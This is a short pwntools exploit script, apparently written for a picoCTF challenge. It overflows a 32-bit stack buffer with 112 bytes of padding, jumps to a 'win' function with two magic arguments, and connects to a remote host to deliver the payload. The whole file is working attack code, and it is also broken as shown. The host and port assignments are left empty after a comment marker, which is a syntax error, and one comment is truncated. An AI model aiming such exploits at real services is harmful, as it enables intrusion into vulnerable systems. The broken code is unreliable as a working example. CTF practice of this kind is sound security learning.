from pwn import *

# Set up the target; adjust the host and port as needed
target_host = #'saturn.picoctf.net' picoCTF host
target_port = #63465 port shown in picoCTF

# Load the ELF binary
elf = ELF('./vuln')

# Determine the offset
offset = 112  # Replace with the correct offset determined via cyclic patte>

# Addresses and arguments
win_address = elf.symbols['win']
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D

# Construct the payload
payload = b'A' * offset
payload += p32(win_address)
payload += p32(0)  # Fake return address
payload += p32(arg1)
payload += p32(arg2)

# Connect to the remote service
p = remote(target_host, target_port)

# Send the payload
p.sendline(payload)

# Interact with the service
p.interactive()
